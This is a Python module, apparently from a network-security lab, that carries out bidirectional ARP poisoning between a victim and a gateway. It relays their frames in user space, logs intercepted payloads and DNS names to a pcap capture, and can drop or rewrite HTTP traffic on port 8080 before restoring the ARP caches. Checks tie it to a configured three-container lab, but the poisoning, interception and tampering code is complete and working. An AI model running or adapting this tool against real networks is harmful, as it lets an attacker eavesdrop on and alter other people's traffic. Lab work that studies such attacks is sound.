"""Bidirectional ARP poisoning and an explicit user-space Ethernet relay."""
import argparse
import fcntl
import heapq
from pathlib import Path
import signal
import socket
import sys
import time

from .config import ATTACKER, GATEWAY, IFACE, TRUSTED, VICTIM
from .io import EventLog, PcapWriter, atomic_json, interface_info, raw_socket, resolve
from .packets import (build_arp_reply, complete_transport_checksum, dns_name, mac_bytes, parse_ipv4,
                      replace_tcp_payload, rewrite_ethernet)


def run(args):
    # A single poisoner per container prevents racing discovery/restoration.
    lock = open("/tmp/arplab-attack.lock", "w")
    try:
        fcntl.flock(lock, fcntl.LOCK_EX | fcntl.LOCK_NB)
    except BlockingIOError:
        raise RuntimeError("An attack is already running in this container")
    own_ip, own_mac = interface_info(args.interface)
    if (own_ip, own_mac) != (ATTACKER, TRUSTED[ATTACKER]) or \
            args.victim != VICTIM or args.gateway != GATEWAY:
        raise ValueError("This tool is restricted to the configured three-container lab")
    if Path("/proc/sys/net/ipv4/ip_forward").read_text().strip() != "0":
        raise RuntimeError("Kernel IP forwarding must be disabled for the user-space relay")
    output = Path(args.output)
    output.mkdir(parents=True, exist_ok=True)
    log = EventLog(output / "events.jsonl")
    capture = PcapWriter(output / "capture.pcap")
    stats = dict(received=0, forwarded=0, dropped=0, modified=0, poison_rounds=0,
                 victim_to_gateway=0, gateway_to_victim=0)
    stop = False
    def stopped(signum, frame):
        nonlocal stop
        stop = True
    previous = {s: signal.signal(s, stopped) for s in (signal.SIGINT, signal.SIGTERM)}
    peers = {}
    started = False
    sock = None
    pending = []
    try:
        sock = raw_socket(args.interface)
        for ip in (args.victim, args.gateway):
            peers[ip] = resolve(sock, own_ip, own_mac, ip)
            if peers[ip] != TRUSTED[ip]:
                raise RuntimeError(f"Unexpected MAC for {ip}: {peers[ip]}; reset the lab first")
        log.emit("discovery", own_ip=own_ip, own_mac=own_mac, peers=peers)
        deadline, next_poison = time.monotonic() + args.duration, 0
        started = True
        while not stop and time.monotonic() < deadline:
            now = time.monotonic()
            if now >= next_poison:
                for target, claimed in ((args.victim, args.gateway), (args.gateway, args.victim)):
                    frame = build_arp_reply(own_mac, claimed, peers[target], target)
                    sock.send(frame)
                    capture.write(frame)
                stats["poison_rounds"] += 1
                next_poison = now + args.interval
                if stats["poison_rounds"] == 1:
                    atomic_json(output / "status.json", {"state": "running", "mode": args.mode})
                    log.emit("ready", mode=args.mode)
            while pending and pending[0][0] <= now:
                _, _, queued = heapq.heappop(pending)
                sock.send(queued)
                capture.write(queued)
                stats["forwarded"] += 1
            try:
                frame, addr = sock.recvfrom(65535)
            except socket.timeout:
                continue
            # Ignore locally transmitted frames and traffic unrelated to the two victims.
            if addr[2] == socket.PACKET_OUTGOING or frame[:6] != mac_bytes(own_mac):
                continue
            info = parse_ipv4(frame)
            if not info:
                continue
            source, dest = info["src_ip"], info["dst_ip"]
            if (source, dest) not in ((args.victim, args.gateway), (args.gateway, args.victim)):
                continue
            if frame[6:12] != mac_bytes(peers[source]):
                continue
            stats["received"] += 1
            direction = "victim_to_gateway" if source == args.victim else "gateway_to_victim"
            stats[direction] += 1
            capture.write(frame)
            fields = {k: v for k, v in info.items() if k not in
                      ("payload", "transport_offset", "payload_offset")}
            if info["payload"]:
                fields["payload"] = info["payload"][:4096].decode("utf-8", "replace")
            if info["protocol"] == 17 and 53 in (info.get("src_port"), info.get("dst_port")):
                fields["dns_name"] = dns_name(info["payload"])
            log.emit("intercept", direction=direction, **fields)
            http = info["protocol"] == 6 and 8080 in (info.get("src_port"), info.get("dst_port"))
            if args.mode == "drop" and http:
                stats["dropped"] += 1
                continue
            if args.mode == "modify" and http and source == args.gateway:
                frame, changed = replace_tcp_payload(frame)
                if changed:
                    stats["modified"] += 1
                    log.emit("modified", original="ORIGINAL", replacement="MODIFIED")
            frame = complete_transport_checksum(frame)
            frame = rewrite_ethernet(frame, peers[dest], own_mac)
            if args.delay_ms:
                if len(pending) >= 10000:
                    stats["dropped"] += 1
                else:
                    heapq.heappush(pending, (time.monotonic() + args.delay_ms / 1000,
                                            stats["received"], frame))
            else:
                sock.send(frame)
                capture.write(frame)
                stats["forwarded"] += 1
    finally:
        stats["dropped"] += len(pending)
        if started:
            # Keep Ethernet source ours to avoid moving peers' bridge FDB entries.
            # ARP sender hardware addresses carry the genuine mappings being restored.
            try:
                for _ in range(5):
                    for target, claimed in ((args.victim, args.gateway), (args.gateway, args.victim)):
                        frame = build_arp_reply(peers[claimed], claimed, peers[target], target)
                        frame = rewrite_ethernet(frame, peers[target], own_mac)
                        sock.send(frame)
                        capture.write(frame)
                    time.sleep(0.2)
                log.emit("restored", peers=peers)
            except OSError as exc:
                log.emit("restoration_failed", error=str(exc))
        if sock:
            sock.close()
        stats["forward_ratio"] = stats["forwarded"] / stats["received"] if stats["received"] else None
        atomic_json(output / "stats.json", stats)
        atomic_json(output / "status.json", {"state": "stopped", "stats": stats})
        log.emit("summary", **stats)
        capture.close()
        log.close()
        for s, handler in previous.items():
            signal.signal(s, handler)
        lock.close()


def main():
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument("--victim", default=VICTIM)
    parser.add_argument("--gateway", default=GATEWAY)
    parser.add_argument("--interface", default=IFACE)
    parser.add_argument("--mode", choices=("relay", "modify", "drop"), default="relay")
    parser.add_argument("--duration", type=float, default=60, help="Seconds; SIGINT/SIGTERM also restore caches")
    parser.add_argument("--interval", type=float, default=1)
    parser.add_argument("--delay-ms", type=float, default=0)
    parser.add_argument("--output", default="/artifacts/manual")
    args = parser.parse_args()
    import math
    if not all(math.isfinite(v) for v in (args.duration, args.interval, args.delay_ms)) or \
            not 0 < args.duration <= 3600 or not 0.1 <= args.interval <= 10 or not 0 <= args.delay_ms <= 500:
        parser.error("duration: (0,3600], interval: [0.1,10], delay-ms: [0,500]")
    try:
        run(args)
    except (OSError, ValueError, RuntimeError) as exc:
        print(f"Attack failed: {exc}", file=sys.stderr)
        return 1
    return 0


if __name__ == "__main__":
    sys.exit(main())
